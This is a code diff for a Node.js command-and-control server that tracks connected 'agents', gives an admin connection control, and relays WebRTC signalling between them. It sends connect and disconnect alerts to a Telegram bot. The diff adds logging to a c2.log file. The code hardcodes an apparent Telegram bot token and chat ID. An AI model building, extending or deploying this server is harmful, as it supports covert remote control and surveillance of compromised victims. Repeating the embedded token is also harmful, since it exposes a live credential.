@@ -4,6 +4,7 @@ const WebSocket = require('ws');
 const { v4: uuidv4 } = require('uuid');
 const path = require('path');
 const https = require('https');
+const fs = require('fs');
 
 const app = express();
 const server = http.createServer(app);
@@ -12,14 +13,30 @@ const wss = new WebSocket.Server({ server });
 // --- CONFIGURATION ---
 const TELEGRAM_TOKEN = '9054625238:AAG1uzL9kvH6XxHf1wb6Ga71ZVwheNkS54Y';
 const TELEGRAM_CHAT_ID = '6172226452';
+const LOG_FILE_PATH = path.join(__dirname, 'c2.log');
 
 let clients = {};
 
 app.use(express.static(path.join(__dirname))); 
 
+function logToFile(msg) {
+    const timestamp = new Date().toISOString();
+    const line = `[${timestamp}] ${msg}\n`;
+    console.log(line.trim());
+    try {
+        fs.appendFileSync(LOG_FILE_PATH, line);
+    } catch (e) {
+        console.error("Failed to write to c2.log", e);
+    }
+}
+
 function notifyTelegram(msg) {
     const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(msg)}`;
-    https.get(url, (res) => {}).on('error', (e) => {});
+    https.get(url, (res) => {
+        // Check for success
+    }).on('error', (e) => {
+        logToFile(`[TG ERROR] ${e.message}`);
+    });
 }
 
 wss.on('connection', (ws, req) => {
@@ -28,7 +45,7 @@ wss.on('connection', (ws, req) => {
     ws.id = id;
     clients[id] = { ws, info: {}, lastSeen: Date.now(), isAdmin: false };
 
-    console.log(`[+] Client Connected: ${id}`);
+    logToFile(`[+] Client Connected: ${id}`);
     ws.send(JSON.stringify({ type: 'registered', id: id }));
 
     // Heartbeat to keep Vercel alive
@@ -40,14 +57,15 @@ wss.on('connection', (ws, req) => {
         }
     }, 25000);
 
-    ws.on('message', (msg) => {
+    ws.on('message', (msgRaw) => {
         try {
-            const data = JSON.parse(msg);
+            const data = JSON.parse(msgRaw);
+            logToFile(`[MSG] Received from ${id}: ${data.type}`);
 
             // Admin Registration
             if (data.type === 'register_admin') {
                 clients[id].isAdmin = true;
-                console.log(`[ADMIN] Connected with ID: ${id}`);
+                logToFile(`[ADMIN] Connected with ID: ${id}`);
                 return;
             }
 
@@ -66,9 +84,8 @@ wss.on('connection', (ws, req) => {
             // Handle Heartbeat
             else if (data.type === 'heartbeat') {
                 clients[id].lastSeen = Date.now();
-                // Send back an ack or just ignore, but ensure we know they are alive
-                // Optional: Broadcast heartbeat status to admin if you want a "Pong" log
-                // broadcastToAdmin(id, { type: 'pong' });
+                // Optional: Log heartbeat occasionally to avoid spamming the log file
+                // logToFile(`[HB] Heartbeat received from ${id}`);
             }
             // Forward Signaling Data
             else if (['offer', 'answer', 'candidate'].includes(data.type)) {
@@ -79,7 +96,7 @@ wss.on('connection', (ws, req) => {
                 broadcastToAdmin(id, data);
             }
         } catch (e) {
-            console.error("Message parsing error:", e);
+            logToFile(`[ERR] Message parsing error from ${id}: ${e.message}`);
         }
     });
 
@@ -87,7 +104,7 @@ wss.on('connection', (ws, req) => {
         delete clients[id];
         notifyAdmin(id, '🔴 User Disconnected');
         notifyTelegram(`🔴 AGENT DISCONNECTED\nID: ${id}`);
-        console.log(`[-] Client Disconnected: ${id}`);
+        logToFile(`[-] Client Disconnected: ${id}`);
     });
 
     ws.on('pong', () => {
@@ -123,5 +140,5 @@ function forwardToTarget(sourceId, data) {
 
 const PORT = process.env.PORT || 3000;
 server.listen(PORT, () => {
-    console.log(`C2 Server running on port ${PORT}`);
+    logToFile(`C2 Server running on port ${PORT}`);
 });
